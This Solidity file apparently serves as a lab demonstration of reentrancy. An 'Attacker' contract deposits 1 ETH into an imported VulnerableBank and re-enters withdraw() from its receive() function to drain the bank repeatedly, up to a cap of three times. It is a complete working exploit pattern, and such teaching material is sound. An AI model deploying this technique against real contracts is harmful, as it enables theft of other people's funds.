// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 3;

    constructor(address _bankAddress) {
        vulnerableBank = VulnerableBank(_bankAddress);
    }

    // step 1: deposit then trigger withdrawal
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw();
    }

    // step 2: re-entry point — called every time bank sends ETH
    receive() external payable {
        attackCount++;
        if (attackCount < MAX_ATTACKS &&
            address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}